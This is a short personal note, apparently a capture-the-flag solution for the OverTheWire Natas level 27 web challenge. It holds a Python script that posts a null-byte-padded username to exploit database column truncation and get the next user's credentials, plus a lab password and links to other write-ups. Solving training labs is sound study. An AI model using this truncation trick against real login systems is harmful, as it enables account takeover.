
2024-08-03 14:07

Source: #natas #web #py 

Tags: [[sql]] 










```python
import requests
username = 'natas27'
password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'

url = 'http://natas27.natas.labs.overthewire.org/'  
session = requests.session()

response = session.post(url, data = {"username": "natas28" + "\x00"*58 +"x", "password": "12" },auth =(username,password))

response = session.post(url, data = {"username": "natas28" , "password": "12" },auth =(username,password))
print(response.text)
```

### References

writeups with correct answers - 
https://github.com/timruff/overthewire/blob/main/natas/natas27/exploit.py
https://www.youtube.com/watch?v=87BKWwGEF1Q

writeups with incorrect answers - 
https://www.youtube.com/watch?v=Y7WXxmWKfxs
https://axcheron.github.io/writeups/otw/natas/
https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2729/